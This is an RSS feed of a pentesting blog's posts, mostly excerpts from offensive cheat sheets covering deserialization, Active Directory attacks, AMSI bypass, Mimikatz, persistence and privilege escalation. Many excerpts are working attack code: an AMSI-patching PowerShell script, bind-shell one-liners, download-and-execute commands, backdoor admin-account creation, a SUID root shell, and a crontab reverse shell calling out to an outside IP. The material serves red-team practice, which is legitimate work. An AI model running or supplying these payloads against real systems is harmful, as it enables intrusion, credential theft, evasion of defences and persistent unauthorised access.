<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Introduction on Gray Hat Freelancing</title><link>https://www.grayhatfreelancing.com/</link><description>Recent content in Introduction on Gray Hat Freelancing</description><generator>Hugo -- gohugo.io</generator><copyright>2023</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml"/><item><title>.NET Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</guid><description>.NET Serialization # Summary # Detection Tools Formatters XmlSerializer DataContractSerializer NetDataContractSerializer LosFormatter JSON.NET BinaryFormatter POP Gadgets References Detection # AAEAAD (Hex) = .NET deserialization BinaryFormatter FF01 (Hex) / /w (Base64) = .NET ViewState Example: AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=
Tools # pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters $ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s $ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini $ .</description></item><item><title>Exercism Solutions</title><link>https://www.grayhatfreelancing.com/docs/exercism_solutions/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/exercism_solutions/</guid><description>Exercism Solutions # These solutions are provided so that you can check your work or get an idea, if you&amp;rsquo;re stuck. If you use them to cheat, understand that you&amp;rsquo;re only cheating yourself. That goes for everything on this website.
Python # Armstrong Numbers # import math def is_armstrong_number(number): &amp;#34;&amp;#34;&amp;#34; A number is an &amp;#34;armstrong&amp;#34; number if the sum of the powers of it&amp;#39;s length applied to each digit in the number adds up to the number :param number: int - returns True if number is an amrstrong &amp;#34;&amp;#34;&amp;#34; power = len(str(number)) sums = [] for i in str(number): sums.</description></item><item><title>Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</guid><description>Insecure Deserialization # Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process &amp;ndash; taking data structured from some format, and rebuilding it into an object - OWASP Check the following sub-sections, located in other files :</description></item><item><title>Node Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</guid><description>Node Deserialization # Summary # Exploit node-serialize funcster References Exploit # In Node source code, look for: node-serialize serialize-to-js funcster node-serialize # An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the unserialize() function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).
Generate a serialized payload var y = { rce : function(){ require(&amp;#39;child_process&amp;#39;).</description></item><item><title>PHP Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</guid><description>PHP Deserialization # PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.</description></item><item><title>Insecure Deserialization - Java</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</link><pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</guid><description>Java Deserialization # Detection # &amp;quot;AC ED 00 05&amp;quot; in Hex AC ED: __STREAM_MAGIC__. Specifies that this is a serialization protocol. 00 05: __STREAM_VERSION__. The serialization version. &amp;quot;rO0&amp;quot; in Base64 Content-type = &amp;quot;application/x-java-serialized-object&amp;quot; &amp;quot;H4sIAAAAAAAAAJ&amp;quot; in gzip(base64)
Tools # Ysoserial # frohoff/ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
java -jar ysoserial.jar CommonsCollections1 calc.exe &amp;gt; commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe &amp;gt; groovypayload.bin java -jar ysoserial.</description></item><item><title>Security Innovations - Shred - Command and Control</title><link>https://www.grayhatfreelancing.com/posts/securityinnovations-shred-cmdnctrl/</link><pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/posts/securityinnovations-shred-cmdnctrl/</guid><description>Ooooooh, yeah. I did it, because the range hasn&amp;rsquo;t changed for over a fucking year. That&amp;rsquo;s lazy on their part. The security industry evolves, your ranges should too. Here, I will be using https://caido.io/ instead of Burp or ZAProxy for this&amp;hellip; why? No particular reason. Just to be fair and showcase that such a thing exists. There&amp;rsquo;s also Charles, and many others.
&amp;quot;&amp;gt;&amp;lt;plaintext&amp;gt; - Breaks the search feature, there&amp;rsquo;s cross site scripting here.</description></item><item><title>Amazon AWS S3 Buckets</title><link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link><pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid><description>Amazon Bucket S3 AWS # Amazon S3 (Simple Storage Service) Buckets are data object storage buckets hosted on Amazon&amp;rsquo;s cloud service. Being in the cloud it&amp;rsquo;s a highly scalable data storge service and it allows you to set all sorts of permissions and other controls around your data. That said, there&amp;rsquo;s often plenty of juicy information in Amazon S3 buckets.. there&amp;rsquo;s also often nothing more than just images and such.</description></item><item><title>CSRF Injection</title><link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link><pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid><description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description></item><item><title>Cobalt Strike</title><link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link><pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</guid><description>Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.</description></item><item><title>Brute Force Cracking</title><link>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</link><pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</guid><description>Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
WikiRaider # Generate wordlists fit for your &amp;ldquo;target audience&amp;rdquo;. https://github.com/NorthwaveSecurity/wikiraider
Crunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.</description></item><item><title>Training Grounds</title><link>https://www.grayhatfreelancing.com/docs/training_grounds/</link><pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/training_grounds/</guid><description>Training Grounds # Online Websites and Communities # HackTheBox.EU &amp;amp; HTB Catalogue Hackthebox has online machines to hack, it&amp;rsquo;s a pretty solid training ground, I personally lean towards TryHackMe. But, you should practie everywhere and often. Try learning by doing retired machines following Ippsec videos. HackTheBox Academy is connected to HackerOne.
TryHackMe Tryhackme is another formidable learning platform. Some rooms are simply walkthroughs where you can read, learn and basically just type what they tell you, other rooms require some self-study to complete and there&amp;rsquo;s also challenge rooms, CTFs and King of the Hill competition mode!</description></item><item><title>Updating a github repository after cloning</title><link>https://www.grayhatfreelancing.com/posts/update-github-repo/</link><pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/posts/update-github-repo/</guid><description>Updating Github Repos # println(&amp;ldquo;Hamming difference of: ${count}&amp;quot;)It&amp;rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&amp;hellip; to-do/check list of steps for ease of reference!
Create repository on Github - Go to the website and just create one using their form, get the empty skeleton Clone repository - git clone &amp;lt;your repo&amp;gt; Remove remotes - git remote remove origin Add SSH remotes - git remote add origin git@github.</description></item><item><title>Active Directory Attacks</title><link>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</link><pubDate>Thu, 08 Dec 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</guid><description>Active Directory Attacks # Tools # Impacket or the Windows version
Responder
InveighZero
Mimikatz
Ranger
AdExplorer
CrackMapExec
# use the latest release, CME is now a binary packaged will all its dependencies root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip # execute cme (smb, winrm, mssql, ...) root@payload$ cme smb -L root@payload$ cme smb -M name_module -o VAR=DATA root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares root@payload$ cme smb 192.</description></item><item><title>TryHackMe - Olympus Walkthrough</title><link>https://www.grayhatfreelancing.com/posts/tryhackme_walkthrough_olympus/</link><pubDate>Fri, 25 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/posts/tryhackme_walkthrough_olympus/</guid><description>Task 1 | Connection # https://tryhackme.com/room/olympusroom is a medium difficulty room on [https://tryhackme.com/](TryHackMe training platform) by Gavroche.
It&amp;rsquo;s primary focus is sql injection, in my opinion, with a slant on enumeration and systems comprehension.
We&amp;rsquo;re going to get started by adding olympus.thm to our /etc/hosts file to assist with enumeration.. this is recommended in the description and I&amp;rsquo;ve adopted it as a solid sign that we&amp;rsquo;ll need to do subdomain enumeration.</description></item><item><title>Wordpress Security</title><link>https://www.grayhatfreelancing.com/docs/wordpress/</link><pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/wordpress/</guid><description>WordPress Security # Wordpress Tools: # https://github.com/wpscanteam/wpscan - One of the better tools at it&amp;rsquo;s just. &amp;ndash; gem install wpscan &amp;ndash; docker pull wpscanteam/wpscan &amp;ndash; wpscan &amp;ndash;update # updates the database &amp;ndash; Users of pentesting distrobutions generally should install the version from their repository. https://github.com/nullfil3/xmlrpc-scan https://github.com/relarizky/wpxploit Wordpress Tricks: # load-scripts.php denial of service # load-scripts.php resource exhaustion Wordpress versions 4.9.3 and prior:
/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter Check IP behind Cloudflare # https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/ Get the IP address of a target wordpress website by abusing the ping-back feature</description></item><item><title>Windows - Hardening</title><link>https://www.grayhatfreelancing.com/docs/windows_hardening/</link><pubDate>Mon, 07 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_hardening/</guid><description>Windows - Hardening # Essential Concepts to Understand # Windows Services # Windows Services create and manage critical functions such as network connectivity, storage, memory, sound, user credentials, and data backup and runs automatically in the background. These services are managed by the Service Control Manager panel and divided into three categories, i.e. Local, Network &amp;amp; System. Many applications like browsers and anti-virus software can also run their services for a seamless user experience.</description></item><item><title>Bypassing AMSI protections</title><link>https://www.grayhatfreelancing.com/docs/windows_amsi_bypass/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_amsi_bypass/</guid><description>AMSI Bypass # Which Endpoint Protection is Using AMSI # https://github.com/subat0mik/whoamsi/wiki/Which-Endpoint-Protection-is-Using-AMSI%3F Patching amsi.dll AmsiScanBuffer by rasta-mouse # $Win32 = @&amp;#34; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } &amp;#34;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(&amp;#34;am&amp;#34; + &amp;#34;si.dll&amp;#34;) $Address = [Win32]::GetProcAddress($LoadLibrary, &amp;#34;Amsi&amp;#34; + &amp;#34;Scan&amp;#34; + &amp;#34;Buffer&amp;#34;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.</description></item><item><title>Enumerating Subdomains</title><link>https://www.grayhatfreelancing.com/docs/subdomains_enumeration/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/subdomains_enumeration/</guid><description>Subdomains Enumeration # Enumerate all subdomains (only if the scope is *.domain.ext) # Using Subbrute # git clone https://github.com/TheRook/subbrute python subbrute.py domain.example.com Using KnockPy with Daniel Miessler’s SecLists for subdomain &amp;ldquo;/Discover/DNS&amp;rdquo; # git clone https://github.com/guelfoweb/knock git clone https://github.com/danielmiessler/SecLists.git knockpy domain.com -w subdomains-top1mil-110000.txt Using EyeWitness and Nmap scans from the KnockPy and enumall scans
git clone https://github.com/ChrisTruncer/EyeWitness.git ./setup/setup.sh ./EyeWitness.py -f filename -t optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.</description></item><item><title>Windows - Mimikatz</title><link>https://www.grayhatfreelancing.com/docs/windows_mimikatz/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_mimikatz/</guid><description>Windows - Mimikatz # Mimikatz - Execute commands # Only one command
PS C:\temp\mimikatz&amp;gt; .\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit Mimikatz console (multiple commands)
PS C:\temp\mimikatz&amp;gt; .\mimikatz mimikatz # privilege::debug mimikatz # log mimikatz # sekurlsa::logonpasswords mimikatz # sekurlsa::wdigest Mimikatz - Extract passwords # Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</description></item><item><title>Windows - Persistence</title><link>https://www.grayhatfreelancing.com/docs/windows_persistence/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_persistence/</guid><description>Windows - Persistence # Tools # SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r Hide Your Binary # Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.
PS&amp;gt; attrib +h mimikatz.exe Disable Antivirus and Security # Antivirus Removal # Sophos Removal Tool.ps1 Symantec CleanWipe Elastic EDR/Security cd &amp;#34;C:\Program Files\Elastic\Agent\&amp;#34; PS C:\Program Files\Elastic\Agent&amp;gt; .</description></item><item><title>Windows - Privilege Escalation</title><link>https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/</guid><description>Windows - Privilege Escalation # Tools # PowerSploit&amp;rsquo;s PowerUp powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&amp;#39;); Invoke-AllChecks Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock (Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1 BeRoot - Privilege Escalation Project - Windows / Linux / Mac Windows-Exploit-Suggester ./windows-exploit-suggester.py --update .</description></item><item><title>Windows - Using Credentials</title><link>https://www.grayhatfreelancing.com/docs/windows_using_credentials/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_using_credentials/</guid><description>Windows - Using credentials # TIPS # TIP 1 - Create your credential # net user hacker Hcker_12345678* /add /Y net localgroup administrators hacker /add net localgroup &amp;#34;Remote Desktop Users&amp;#34; hacker /add # RDP access net localgroup &amp;#34;Backup Operators&amp;#34; hacker /add # Full access to files net group &amp;#34;Domain Admins&amp;#34; hacker /add /domain # enable a domain user account net user hacker /ACTIVE:YES /domain # prevent users from changing their password net user username /Passwordchg:No # prevent the password to expire net user hacker /Expires:Never # create a machine account (not shown in net users) net user /add evilbob$ evilpassword # homoglyph Aԁmіnistratοr (different of Administrator) Aԁmіnistratοr Some info about your user</description></item><item><title>Windows Download and Execute Methods</title><link>https://www.grayhatfreelancing.com/docs/windows_download_and_execute/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_download_and_execute/</guid><description>Windows - Download and execute methods # Downloaded files location # C:\Users&amp;lt;username&amp;gt;\AppData\Local\Microsoft\Windows\Temporary Internet Files\ C:\Users&amp;lt;username&amp;gt;\AppData\Local\Microsoft\Windows\INetCache\IE&amp;lt;subdir&amp;gt; C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV Powershell # From an HTTP server
powershell -exec bypass -c &amp;#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&amp;#39;http://webserver/payload.ps1&amp;#39;)|iex&amp;#34; # Download only (New-Object System.Net.WebClient).DownloadFile(&amp;#34;http://10.10.10.10/PowerUp.ps1&amp;#34;, &amp;#34;C:\Windows\Temp\PowerUp.ps1&amp;#34;) Invoke-WebRequest &amp;#34;http://10.10.10.10/binary.exe&amp;#34; -OutFile &amp;#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe&amp;#34; # Download and run Rubeus, with arguments $data = (New-Object System.Net.WebClient).DownloadData(&amp;#39;http://10.10.10.10/Rubeus.exe&amp;#39;) $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(&amp;#34;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt&amp;#34;.Split()) # Execute a specific method from an assembly $data = (New-Object System.</description></item><item><title>Application Escape and Breakout</title><link>https://www.grayhatfreelancing.com/docs/escape_breakout/</link><pubDate>Thu, 03 Nov 2022 04:33:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/escape_breakout/</guid><description>Application Escape and Breakout # Gaining a command shell # Shortcut [Window] + [R] -&amp;gt; cmd [CTRL] + [SHIFT] + [ESC] -&amp;gt; Task Manager [CTRL] + [ALT] + [DELETE] -&amp;gt; Task Manager Access through file browser: Browsing to the folder containing the binary (i.e. C:\windows\system32\), we can simply right click and open it Drag-and-drop: dragging and dropping any file onto the cmd.exe Hyperlink: file:///c:/Windows/System32/cmd.exe Task Manager: File &amp;gt; New Task (Run.</description></item><item><title>Attacking Office</title><link>https://www.grayhatfreelancing.com/docs/office_attacks/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/office_attacks/</guid><description>Office - Attacks # XLSM - Hot Manchego # When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn&amp;rsquo;t catch a simple lolbas payload to get a beacon on a target machine.
https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS&amp;gt; New-Item blank.xlsm PS&amp;gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs PS&amp;gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt XLM - Macrome # XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document.</description></item><item><title>Bind Shell Cheatsheet</title><link>https://www.grayhatfreelancing.com/docs/bind_shell_cheatsheet/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/bind_shell_cheatsheet/</guid><description>Bind Shell # Perl # perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; Python # Single line :
python -c &amp;#39;exec(&amp;#34;&amp;#34;&amp;#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&amp;#34;0.0.0.0&amp;#34;,51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&amp;#34;&amp;#34;&amp;#34;)&amp;#39; Expanded version :
import socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((&amp;#34;0.0.0.0&amp;#34;, 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read()) PHP # php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.</description></item><item><title>Bug Hunting Methodology and Enumeration</title><link>https://www.grayhatfreelancing.com/docs/methodology_and_enumeration/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/methodology_and_enumeration/</guid><description>Bug Hunting Methodology and Enumeration # Passive recon # Using Shodan (https://www.shodan.io/) to detect similar app
can be integrated with nmap (https://github.com/glennzw/shodan-hq-nse) nmap --script shodan-hq.nse --script-args &amp;#39;apikey=&amp;lt;yourShodanAPIKey&amp;gt;,target=&amp;lt;hackme&amp;gt;&amp;#39; Using The Wayback Machine (https://archive.org/web/) to detect forgotten endpoints
look for JS files, old links curl -sX GET &amp;#34;http://web.archive.org/cdx/search/cdx?url=&amp;lt;targetDomain.com&amp;gt;&amp;amp;output=text&amp;amp;fl=original&amp;amp;collapse=urlkey&amp;amp;matchType=prefix&amp;#34; Using The Harvester
python theHarvester.py -b all -d domain.com Active recon # Network discovery with masscan, nmap etc.
rpcclient
$ rpcclient -U &amp;#39;%&amp;#39; [target host] rpcclient $&amp;gt; querydominfo Domain: WORKGROUP Server: METASPLOITABLE Comment: metasploitable server (Samba 3.</description></item><item><title>Hash Cracking Cheatsheet</title><link>https://www.grayhatfreelancing.com/docs/hash_cracking/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/hash_cracking/</guid><description>Hash Cracking # Hashcat # Hashcat Install # apt install cmake build-essential -y apt install checkinstall git -y git clone https://github.com/hashcat/hashcat.git &amp;amp;&amp;amp; cd hashcat &amp;amp;&amp;amp; make -j 8 &amp;amp;&amp;amp; make install Extract the hash Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes Establish a cracking stratgy based on hash format (ex: wordlist -&amp;gt; wordlist + rules -&amp;gt; mask -&amp;gt; combinator mode -&amp;gt; prince attack -&amp;gt; &amp;hellip;) Enjoy plains Review strategy Start over Dictionary # Every word of a given list (a.</description></item><item><title>Linux - Persistence</title><link>https://www.grayhatfreelancing.com/docs/linux_persistence/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/linux_persistence/</guid><description>Linux - Persistence # Basic reverse shell # ncat --udp -lvp 4242 ncat --sctp -lvp 4242 ncat --tcp -lvp 4242 Add a root user # sudo useradd -ou 0 -g 0 john sudo passwd john echo &amp;#34;linuxpassword&amp;#34; | passwd --stdin john Suid Binary # TMPDIR2=&amp;#34;/var/tmp&amp;#34; echo &amp;#39;int main(void){setresuid(0, 0, 0);system(&amp;#34;/bin/sh&amp;#34;);}&amp;#39; &amp;gt; $TMPDIR2/croissant.c gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2&amp;gt;/dev/null rm $TMPDIR2/croissant.c chown root:root $TMPDIR2/croissant chmod 4777 $TMPDIR2/croissant Crontab - Reverse shell # (crontab -l ; echo &amp;#34;@reboot sleep 200 &amp;amp;&amp;amp; ncat 192.</description></item></channel></rss>